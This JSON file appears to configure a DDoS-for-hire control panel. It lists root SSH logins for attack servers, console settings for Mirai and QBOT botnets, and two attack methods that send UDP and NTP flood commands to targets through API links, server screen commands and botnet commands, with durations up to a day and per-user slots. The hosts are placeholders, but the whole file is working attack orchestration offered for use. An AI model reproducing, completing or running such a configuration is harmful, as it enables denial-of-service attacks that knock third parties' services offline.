{
    "server_list": [
        {
            "enabled": true,
            "tag": "LAYER 4 #1",
            "configuration": {
                "ip": "1.1.1.1",
                "port": 22,
                "username": "root",
                "password": "password"
            }
        },
        {
            "enabled": true,
            "tag": "LAYER 7 #1",
            "configuration": {
                "ip": "1.3.3.7",
                "port": 22,
                "username": "root",
                "password": "password"
            }
        }
    ],
    "botnet_list": [
        {
            "enabled": true,
            "tag": "MIRAI",
            "settings": {
                "note": "these settings below are executed in order: login_word -> initial_enter -> tos_page",
                "login_word": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500,
                    "word": "botnet"
                },
                "initial_enter": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500
                },
                "tos_page": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500,
                    "command": "y"
                },
                "sleep_in_milliseconds": {
                    "before_username": 1000,
                    "before_password": 1000,
                    "before_command": 1000
                }
            },
            "config": {
                "host": "8.8.8.8",
                "port": 22,
                "username": "username",
                "password": "password"
            }
        },
        {
            "enabled": true,
            "tag": "QBOT",
            "settings": {
                "note": "these settings below are executed in this order: login_word -> initial_enter -> tos_page",
                "login_word": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500,
                    "word": "botnet"
                },
                "initial_enter": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500
                },
                "tos_page": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500,
                    "command": "y"
                },
                "sleep_in_milliseconds": {
                    "before_username": 1000,
                    "before_password": 1000,
                    "before_command": 1000
                }
            },
            "config": {
                "host": "1.1.1.1",
                "port": 22,
                "username": "username",
                "password": "password"
            }
        }
    ],
    "attacks": [
        {
            "method_name": "test4",
            "api_funnel": {
                "enabled": true,
                "links": [
                    {
                        "link": "https://cloudflare.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=HOME-NTP",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "https://google.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=HOME-NTP",
                        "max_time": 1200,
                        "enabled": false
                    }
                ]
            },
            "server_funnel": {
                "enabled": true,
                "all": {
                    "enabled": true,
                    "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} {THREADS} {TIME}"
                },
                "select": {
                    "enabled": false,
                    "servers": [
                        {
                            "tag": "LAYER 4 #1",
                            "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} 10 {TIME}",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 4 #2",
                            "command": "screen -dmS {HOST} ./HOMEV2 {HOST} {PORT} {THREADS} {TIME}",
                            "enabled": true
                        }
                    ]
                }
            },
            "botnet_funnel": {
                "enabled": true,
                "all": {
                    "enabled": true,
                    "command": ".attack UDP {HOST} {PORT} {TIME}"
                },
                "select": {
                    "enabled": false,
                    "botnets": [
                        {
                            "tag": "QBOT",
                            "command": ".udp {HOST} {TIME} -dport={PORT}",
                            "enabled": true
                        },
                        {
                            "tag": "MIRAI",
                            "command": "UDPFLOOD {HOST} {PORT} {TIME}",
                            "enabled": true
                        }
                    ]
                }
            },
            "configuration": {
                "method_slots": {
                    "max": 3,
                    "enabled": true
                },
                "method_min_time": {
                    "time": 20,
                    "enabled": false
                },
                "method_max_time": {
                    "note": "users with the soft max time bypass role can attack over soft max time if their account can. nobody bypasses hard max time.",
                    "hard": {
                        "time": 86400,
                        "enabled": true
                    },
                    "soft": {
                        "time": 200,
                        "enabled": false
                    }
                }
            },
            "method_status": {
                "enabled": true,
                "settings": {
                    "note": "please only enable one of the two options below. (Note: You can have both disabled)",
                    "cnc_access_only": false,
                    "api_access_only": false
                },
                "restrictions": {
                    "target_validation": {
                        "note": "please only enable one of the two options below. (Note: You can have both disabled)",
                        "ip_address_targets_only": false,
                        "url_and_domain_targets_only": false
                    },
                    "method_group": {
                        "name": "main_network",
                        "require_method_group_role": false
                    },
                    "as_number_whitelist": {
                        "enabled": false,
                        "as_number": []
                    },
                    "note": "please only enable one of the two options below. (Note: You can have both disabled)",
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": []
                    }
                }
            }
        },
        {
            "method_name": "test5",
            "api_funnel": {
                "enabled": true,
                "links": [
                    {
                        "link": "https://cloudflare.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=HOME-NTP",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "https://google.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=HOME-NTP",
                        "max_time": 1200,
                        "enabled": false
                    }
                ]
            },
            "server_funnel": {
                "enabled": true,
                "all": {
                    "enabled": true,
                    "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} {THREADS} {TIME}"
                },
                "select": {
                    "enabled": false,
                    "servers": [
                        {
                            "tag": "LAYER 4 #1",
                            "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} 10 {TIME}",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 4 #2",
                            "command": "screen -dmS {HOST} ./HOMEV2 {HOST} {PORT} {THREADS} {TIME}",
                            "enabled": true
                        }
                    ]
                }
            },
            "botnet_funnel": {
                "enabled": true,
                "all": {
                    "enabled": true,
                    "command": ".attack UDP {HOST} {PORT} {TIME}"
                },
                "select": {
                    "enabled": false,
                    "botnets": [
                        {
                            "tag": "QBOT",
                            "command": ".udp {HOST} {TIME} -dport={PORT}",
                            "enabled": true
                        },
                        {
                            "tag": "MIRAI",
                            "command": "UDPFLOOD {HOST} {PORT} {TIME}",
                            "enabled": true
                        }
                    ]
                }
            },
            "configuration": {
                "method_slots": {
                    "max": 3,
                    "enabled": true
                },
                "method_min_time": {
                    "time": 20,
                    "enabled": false
                },
                "method_max_time": {
                    "note": "users with the soft max time bypass role can attack over soft max time if their account can. nobody bypasses hard max time.",
                    "hard": {
                        "time": 86400,
                        "enabled": true
                    },
                    "soft": {
                        "time": 200,
                        "enabled": false
                    }
                }
            },
            "method_status": {
                "enabled": true,
                "settings": {
                    "note": "please only enable one of the two options below. (Note: You can have both disabled)",
                    "cnc_access_only": false,
                    "api_access_only": false
                },
                "restrictions": {
                    "target_validation": {
                        "note": "please only enable one of the two options below. (Note: You can have both disabled)",
                        "ip_address_targets_only": false,
                        "url_and_domain_targets_only": false
                    },
                    "method_group": {
                        "name": "main_network",
                        "require_method_group_role": false
                    },
                    "as_number_whitelist": {
                        "enabled": false,
                        "as_number": []
                    },
                    "note": "please only enable one of the two options below. (Note: You can have both disabled)",
                    "vip": false,
                    "private": {
                        "enabled": false,
                        "users": []
                    }
                }
            }
        }
    ] 
}